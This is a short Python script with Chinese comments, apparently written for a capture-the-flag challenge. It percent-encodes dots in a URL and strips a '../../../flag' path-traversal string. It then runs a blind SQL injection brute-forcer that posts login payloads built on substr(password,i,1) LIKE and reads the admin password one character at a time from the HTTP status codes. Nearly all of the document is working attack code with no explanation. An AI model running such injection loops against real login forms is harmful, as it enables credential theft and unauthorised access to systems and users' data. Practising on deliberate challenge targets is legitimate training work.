# 编码url

url_here = ""
url_here = url_here.replace(".","%2e")
print(url_here)

url_test = "../../../flag"
print(url_test.strip("/."))
# 爆破


import  requests
import string
coder=string.ascii_letters+ '{}._-'
result = ""
for i in range(0,100):
    for hope_letter in coder:

        res = requests.post("http://challenge.localhost",data={"username":"admin","password":f"' OR substr(password,{i},1) LIKE {hope_letter} --"})
        if res.status_code!=500:
            result += hope_letter
            break
        print(hope_letter)